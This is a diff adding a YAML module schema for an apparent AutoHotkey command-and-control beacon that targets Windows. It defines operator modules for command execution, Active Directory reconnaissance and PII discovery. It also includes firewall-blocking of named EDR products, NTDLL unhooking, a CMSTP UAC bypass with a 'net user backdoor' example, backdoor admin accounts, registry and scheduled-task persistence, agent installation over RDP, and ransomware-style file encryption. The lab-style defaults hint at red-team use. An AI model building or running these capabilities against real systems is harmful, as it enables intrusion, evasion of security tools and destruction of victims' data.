@@ -1,0 +1,699 @@
+# Default Windows Agent Module Schema
+# Based on current hardcoded modules in command_widget.py
+
+schema_version: "1.0"
+agent_info:
+  agent_type: "autohotkey_beacon"
+  version: "1.0.0"
+  description: "Default AutoHotkey C2 beacon"
+  supported_platforms: ["windows"]
+
+categories:
+  basic_commands:
+    display_name: "Basic Commands"
+    description: "Fundamental command execution capabilities"
+    modules:
+      command_execution:
+        display_name: "Command Execution"
+        description: "Execute arbitrary system commands"
+        command_template: "{command}"
+        parameters:
+          command:
+            type: "textarea"
+            display_name: "Command"
+            description: "Enter command to execute on the target system"
+            required: true
+            default: ""
+            validation:
+              min_length: 1
+              max_length: 8192
+        documentation:
+          content: "Execute system commands directly on the target machine. Use with caution as commands are executed with the privileges of the beacon process."
+          examples:
+            - "whoami"
+            - "systeminfo"
+            - "dir C:\\"
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          icon: "terminal"
+          layout: "simple"
+
+      winget_ps_execution:
+        display_name: "WinGet PS Execution"
+        description: "Execute PowerShell scripts using WinGet module"
+        command_template: "execute_module|ExecuteWinGetPS"
+        parameters:
+          script:
+            type: "textarea"
+            display_name: "PowerShell Script"
+            description: "Enter PowerShell script to execute"
+            required: true
+            default: |
+              $logFile = "C:\\Temp\\log.txt";
+              $host = Get-Host;
+              Set-Content $logFile $host;
+              $proc = Get-ExecutionPolicy;
+              Add-Content $logFile -Value $proc;
+            validation:
+              min_length: 1
+              max_length: 32768
+        documentation:
+          content: "Execute PowerShell scripts through the WinGet execution module. Scripts are executed in the context of the beacon process."
+          examples:
+            - "Get-Process | Select-Object Name, CPU"
+            - "Get-WmiObject -Class Win32_ComputerSystem"
+        execution:
+          timeout: 600
+          requires_admin: false
+        ui:
+          icon: "powershell"
+          layout: "advanced"
+
+  discovery:
+    display_name: "Discovery"
+    description: "Information gathering and reconnaissance modules"
+    modules:
+      basic_recon:
+        display_name: "Basic Recon"
+        description: "Perform basic reconnaissance by executing SystemInfo and arp -a"
+        command_template: "execute_module|BasicRecon"
+        parameters: {}
+        documentation:
+          content: "Gathers basic system information including OS details, hardware configuration, and network ARP table."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "search"
+          layout: "simple"
+
+      discover_pii:
+        display_name: "Discover PII"
+        description: "Recursively scan text files in a directory to identify potential PII"
+        command_template: "execute_module|DiscoverPII|{directory_path},{context_length}"
+        parameters:
+          directory_path:
+            type: "directory"
+            display_name: "Directory Path"
+            description: "Enter the directory path as it appears on the target system"
+            required: true
+            default: ""
+            validation:
+              pattern: "^[A-Za-z]:\\\\.*"
+          context_length:
+            type: "integer"
+            display_name: "Context Length"
+            description: "Number of characters to capture around PII matches"
+            required: true
+            default: 30
+            validation:
+              min_value: 1
+              max_value: 1000
+        documentation:
+          content: "Scans text files recursively in the specified directory to identify potential personally identifiable information such as phone numbers, SSNs, and dates."
+          examples:
+            - "C:\\Users\\Administrator\\Documents\\"
+            - "C:\\temp\\"
+        execution:
+          timeout: 600
+          requires_admin: false
+        ui:
+          icon: "shield"
+          layout: "simple"
+          grouping:
+            - ["directory_path"]
+            - ["context_length"]
+
+      enumerate_dcs:
+        display_name: "Enumerate DCs"
+        description: "Identify all Domain Controllers in the current domain"
+        command_template: "execute_module|EnumerateDCs"
+        parameters: {}
+        documentation:
+          content: "Enumerates all Domain Controllers in the current Active Directory domain."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "server"
+          layout: "simple"
+
+      domain_trusts:
+        display_name: "Domain Trusts"
+        description: "Enumerate trusted domains in the current Active Directory environment"
+        command_template: "execute_module|DomainTrustRecon"
+        parameters: {}
+        documentation:
+          content: "Enumerates all trust relationships for the current domain."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "link"
+          layout: "simple"
+
+      domain_admins:
+        display_name: "Domain Admins"
+        description: "Enumerate all members of the Domain Admins group"
+        command_template: "execute_module|IdentifyDomainAdmins"
+        parameters: {}
+        documentation:
+          content: "Enumerates all members of the Domain Admins group, providing visibility into high-privilege account holders in the domain."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "crown"
+          layout: "simple"
+
+      unconstrained_delegation:
+        display_name: "Unconstrained Delegation"
+        description: "Identify computers with unconstrained delegation enabled"
+        command_template: "execute_module|CheckUnconstrainedDelegation"
+        parameters: {}
+        documentation:
+          content: "Identifies computers with unconstrained delegation enabled, which could represent potential security vulnerabilities in the domain."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "warning"
+          layout: "simple"
+
+      active_user_membership:
+        display_name: "Active User Membership"
+        description: "Enumerate all group memberships for the currently active user"
+        command_template: "execute_module|ActiveUserMembership"
+        parameters: {}
+        documentation:
+          content: "Enumerates all group memberships for the currently active user, providing a comprehensive view of the user's permissions and access levels within the domain."
+          examples: []
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          icon: "users"
+          layout: "simple"
+
+      port_scanner:
+        display_name: "Port Scanner"
+        description: "Perform TCP port scanning by attempting socket connections"
+        command_template: "execute_module|PortScanner|{target_ips},{ports},{timeout},{threads}"
+        parameters:
+          target_ips:
+            type: "text"
+            display_name: "Target IPs"
+            description: "Comma-separated list of IP addresses or ranges to scan"
+            required: true
+            default: "192.168.1.1"
+            validation:
+              pattern: "^[0-9.,\\-/\\s]+$"
+          ports:
+            type: "text"
+            display_name: "Ports"
+            description: "Comma-separated list of ports to scan (e.g., 22,80,443 or 1-1000)"
+            required: true
+            default: "22,80,443,3389"
+          timeout:
+            type: "integer"
+            display_name: "Timeout (seconds)"
+            description: "Connection timeout for each port"
+            required: true
+            default: 3
+            validation:
+              min_value: 1
+              max_value: 30
+          threads:
+            type: "integer"
+            display_name: "Threads"
+            description: "Number of concurrent scanning threads"
+            required: true
+            default: 50
+            validation:
+              min_value: 1
+              max_value: 200
+        documentation:
+          content: "Performs TCP port scanning against specified targets and ports using socket connections."
+          examples:
+            - "192.168.1.1-254 for target range"
+            - "1-1000 for port range"
+            - "22,80,443,3389 for specific ports"
+        execution:
+          timeout: 1800
+          requires_admin: false
+        ui:
+          icon: "network"
+          layout: "advanced"
+          grouping:
+            - ["target_ips", "ports"]
+            - ["timeout", "threads"]
+
+  evasion:
+    display_name: "Evasion"
+    description: "Modules for evading detection and defensive measures"
+    modules:
+      deny_outbound_firewall:
+        display_name: "Deny Outbound Firewall"
+        description: "Block outbound traffic through netsh for targeted executable names"
+        command_template: "execute_module|DenyOutboundFirewall|{target_files}"
+        parameters:
+          target_files:
+            type: "textarea"
+            display_name: "Target Files"
+            description: "Not case sensitive, comma separated list only"
+            required: true
+            default: "csfalconservice, sentinelone, cylancesvc, SEDservice"
+            validation:
+              min_length: 1
+              max_length: 1024
+        documentation:
+          content: "Blocks outbound traffic through netsh for targeted executable names found in Program Files."
+          examples:
+            - "csfalconservice, sentinelone, cylancesvc"
+        execution:
+          timeout: 300
+          requires_admin: true
+        ui:
+          icon: "firewall"
+          layout: "simple"
+
+      host_file_url_block:
+        display_name: "Host File URL Block"
+        description: "Block outbound traffic through the host file by setting target URL IPs to 127.0.0.1"
+        command_template: "execute_module|HostFileURLBlock|{target_urls}"
+        parameters:
+          target_urls:
+            type: "textarea"
+            display_name: "Target URLs"
+            description: "Not case sensitive, comma separated list only"
+            required: true
+            default: "example1.com, example2.com"
+            validation:
+              min_length: 1
+              max_length: 1024
+        documentation:
+          content: "Blocks outbound traffic through the host file by setting target URL IPs to 127.0.0.1."
+          examples:
+            - "example1.com, example2.com"
+            - "malicious-site.com, tracking-domain.net"
+        execution:
+          timeout: 120
+          requires_admin: true
+        ui:
+          icon: "block"
+          layout: "simple"
+
+      unhook_ntdll:
+        display_name: "Unhook NTDLL"
+        description: "Attempt to unhook NTDLL by restoring a clean version from sys32"
+        command_template: "execute_module|UnhookNTDLL"
+        parameters: {}
+        documentation:
+          content: "Attempts to unhook NTDLL by restoring a clean version from sys32 to evade API hooking by security products."
+          examples: []
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          icon: "unlink"
+          layout: "simple"
+
+  privilege_escalation:
+    display_name: "Privilege Escalation"
+    description: "Modules for escalating privileges on the target system"
+    modules:
+      cmstp_uac_bypass:
+        display_name: "CMSTP UAC Bypass"
+        description: "Bypass UAC using CMSTP.exe technique"
+        command_template: "execute_module|CMSTP_UAC_Bypass|{command}"
+        parameters:
+          command:
+            type: "text"
+            display_name: "Command to Execute"
+            description: "Command to execute with elevated privileges"
+            required: true
+            default: "cmd.exe /c whoami > C:\\temp\\elevated.txt"
+            validation:
+              min_length: 1
+              max_length: 1024
+        documentation:
+          content: "Uses the CMSTP.exe UAC bypass technique to execute commands with elevated privileges without triggering UAC prompts."
+          examples:
+            - "cmd.exe /c net user backdoor P@ssw0rd /add"
+            - "powershell.exe -Command \"Get-Process\""
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          icon: "key"
+          layout: "simple"
+
+      run_as_user:
+        display_name: "Run As User"
+        description: "Execute commands in the context of a different user"
+        command_template: "execute_module|RunAsUser|{username},{password},{command}"
+        parameters:
+          username:
+            type: "text"
+            display_name: "Username"
+            description: "Username to execute command as"
+            required: true
+            default: ""
+          password:
+            type: "text"
+            display_name: "Password"
+            description: "Password for the specified user"
+            required: true
+            default: ""
+          command:
+            type: "text"
+            display_name: "Command"
+            description: "Command to execute as the specified user"
+            required: true
+            default: "whoami"
+            validation:
+              min_length: 1
+              max_length: 1024
+        documentation:
+          content: "Execute commands in the context of a different user account using provided credentials."
+          examples:
+            - "Administrator / P@ssw0rd / net user"
+        execution:
+          timeout: 300
+          requires_admin: true
+        ui:
+          icon: "user"
+          layout: "simple"
+          grouping:
+            - ["username", "password"]
+            - ["command"]
+
+  persistence:
+    display_name: "Persistence"
+    description: "Modules for maintaining persistent access to the target system"
+    modules:
+      add_admin_user:
+        display_name: "Add Admin User"
+        description: "Create a new administrative user account"
+        command_template: "execute_module|AddAdminUser|{username},{password}"
+        parameters:
+          username:
+            type: "text"
+            display_name: "Username"
+            description: "Username for the new administrative account"
+            required: true
+            default: "backdoor"
+            validation:
+              min_length: 1
+              max_length: 20
+              pattern: "^[a-zA-Z0-9_]+$"
+          password:
+            type: "text"
+            display_name: "Password"
+            description: "Password for the new administrative account"
+            required: true
+            default: "P@ssw0rd123"
+            validation:
+              min_length: 8
+              max_length: 128
+        documentation:
+          content: "Creates a new user account and adds it to the local administrators group for persistent access."
+          examples:
+            - "backdoor / P@ssw0rd123"
+        execution:
+          timeout: 60
+          requires_admin: true
+        ui:
+          icon: "user-plus"
+          layout: "simple"
+
+      add_startup_to_registry:
+        display_name: "Add Startup to Registry"
+        description: "Add the agent script to the user's CurrentVersion\\Run registry"
+        command_template: "execute_module|AddScriptToRegistry|{key_name}"
+        parameters:
+          key_name:
+            type: "text"
+            display_name: "Key Name"
+            description: "This is just the name of the entry that will be created"
+            required: true
+            default: "StartUp"
+            validation:
+              min_length: 1
+              max_length: 64
+        documentation:
+          content: "Adds the agent script to the user's CurrentVersion\\Run registry for persistence."
+          examples:
+            - "StartUp"
+            - "WindowsUpdate"
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          icon: "registry"
+          layout: "simple"
+
+      add_scheduled_task:
+        display_name: "Add Scheduled Task"
+        description: "Add a recurring scheduled task"
+        command_template: "execute_module|CreateScheduledTask|{task_name},{action},{delay}"
+        parameters:
+          task_name:
+            type: "text"
+            display_name: "Task Name"
+            description: "Name for the scheduled task"
+            required: true
+            default: "ScheduledTask"
+            validation:
+              min_length: 1
+              max_length: 64
+          action:
+            type: "text"
+            display_name: "Action"
+            description: "Command or executable to run"
+            required: true
+            default: '"App.exe" /param1'
+            validation:
+              min_length: 1
+              max_length: 512
+          delay:
+            type: "integer"
+            display_name: "Delay (Hours)"
+            description: "The task will execute every 24hrs after the delay"
+            required: true
+            default: 1
+            validation:
+              min_value: 1
+              max_value: 1000
+        documentation:
+          content: "Adds a recurring scheduled task. With inputs empty, it will add task to launch the agent."
+          examples:
+            - "ScheduledTask / App.exe / 1"
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          icon: "clock"
+          layout: "simple"
+          grouping:
+            - ["task_name", "action"]
+            - ["delay"]
+
+  lateral_movement:
+    display_name: "Lateral Movement"
+    description: "Modules for moving laterally through the network"
+    modules:
+      install_msi:
+        display_name: "Install MSI"
+        description: "Download and silently install the specified MSI file"
+        command_template: "execute_module|InstallMSI|{download_url},{download_path},{install_dir}"
+        parameters:
+          download_url:
+            type: "text"
+            display_name: "Download URL"
+            description: "URL to download the MSI package from"
+            required: true
+            default: "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.82-installer.msi"
+            validation:
+              min_length: 1
+              max_length: 512
+          download_path:
+            type: "text"
+            display_name: "Download Path"
+            description: "Local filename to save the downloaded MSI"
+            required: true
+            default: "putty-install.msi"
+            validation:
+              min_length: 1
+              max_length: 256
+          install_dir:
+            type: "text"
+            display_name: "Install Directory"
+            description: "Directory to install the MSI package"
+            required: true
+            default: "C:\\Users\\user1\\AppData\\Local"
+            validation:
+              min_length: 1
+              max_length: 256
+        documentation:
+          content: "Attempts to download and silently install the specified MSI file. Installs PuTTY by default."
+          examples:
+            - "MSI URL / local-file.msi / C:\\temp"
+        execution:
+          timeout: 1800
+          requires_admin: false
+        ui:
+          icon: "package"
+          layout: "simple"
+          grouping:
+            - ["download_url"]
+            - ["download_path", "install_dir"]
+
+      rdp_connection:
+        display_name: "RDP Connection"
+        description: "Connect to a host via RDP and install the agent"
+        command_template: "execute_module|RDPConnect|{hostname},{username},{password},{server_ip},{domain}"
+        parameters:
+          hostname:
+            type: "text"
+            display_name: "Hostname/IP"
+            description: "Target hostname or IP address"
+            required: true
+            default: "192.168.124.125"
+            validation:
+              min_length: 1
+              max_length: 256
+          username:
+            type: "text"
+            display_name: "Username"
+            description: "Username for RDP connection"
+            required: true
+            default: "Administrator"
+            validation:
+              min_length: 1
+              max_length: 64
+          password:
+            type: "text"
+            display_name: "Password"
+            description: "Password for RDP connection"
+            required: true
+            default: "hunter2"
+            validation:
+              min_length: 1
+              max_length: 128
+          server_ip:
+            type: "text"
+            display_name: "C2 Server IP"
+            description: "This is the IP you want the new agent to connect to"
+            required: true
+            default: "192.168.124.22"
+            validation:
+              min_length: 1
+              max_length: 15
+          domain:
+            type: "text"
+            display_name: "Domain"
+            description: "Domain for authentication (optional)"
+            required: false
+            default: "lab.local"
+            validation:
+              max_length: 64
+        documentation:
+          content: "Connects to a host via RDP and installs the agent on the target system."
+          examples:
+            - "192.168.1.100 / admin / password / 192.168.1.50 / domain.local"
+        execution:
+          timeout: 600
+          requires_admin: false
+        ui:
+          icon: "remote-desktop"
+          layout: "advanced"
+          grouping:
+            - ["hostname", "username", "password"]
+            - ["server_ip", "domain"]
+
+  impact:
+    display_name: "Impact"
+    description: "Modules that can impact or modify target system data"
+    modules:
+      encrypt_files:
+        display_name: "Encrypt Files"
+        description: "Encrypt files in specified directory for demonstration/testing"
+        command_template: "execute_module|EncryptDirectory|{directory_path},{file_extensions},{encryption_key}"
+        parameters:
+          directory_path:
+            type: "directory"
+            display_name: "Directory Path"
+            description: "Target directory containing files to encrypt"
+            required: true
+            default: "C:\\temp\\test"
+          file_extensions:
+            type: "text"
+            display_name: "File Extensions"
+            description: "Comma-separated list of file extensions to encrypt"
+            required: true
+            default: ".txt,.doc,.pdf"
+          encryption_key:
+            type: "text"
+            display_name: "Encryption Key"
+            description: "Encryption key for file encryption (keep secure!)"
+            required: true
+            default: ""
+            validation:
+              min_length: 16
+              max_length: 256
+        documentation:
+          content: "Encrypts files in the specified directory with given extensions. WARNING: This is for testing/demonstration only. Keep encryption keys secure."
+          examples:
+            - "C:\\temp\\test / .txt,.doc / MySecretKey123456"
+        execution:
+          timeout: 1800
+          requires_admin: false
+        ui:
+          icon: "lock"
+          layout: "advanced"
+          color: "red"
+          grouping:
+            - ["directory_path", "file_extensions"]
+            - ["encryption_key"]
+
+      decrypt_files:
+        display_name: "Decrypt Files"
+        description: "Decrypt files in specified directory with the provided password"
+        command_template: "execute_module|DecryptDirectory|{directory_path},{password}"
+        parameters:
+          directory_path:
+            type: "directory"
+            display_name: "Directory Path"
+            description: "Enter the full file path as it appears on the target system"
+            required: true
+            default: "C:\\Users\\Administrator\\Documents"
+            validation:
+              pattern: "^[A-Za-z]:\\\\.*"
+          password:
+            type: "text"
+            display_name: "Password"
+            description: "Password used to decrypt the files"
+            required: true
+            default: "P@ssw0rd123!"
+            validation:
+              min_length: 1
+              max_length: 256
+        documentation:
+          content: "Decrypts files in the target directory with the specified password. Use with files encrypted by the encrypt module."
+          examples:
+            - "C:\\temp\\encrypted / MyDecryptionKey"
+        execution:
+          timeout: 1800
+          requires_admin: false
+        ui:
+          icon: "unlock"
+          layout: "simple"
+          color: "green"
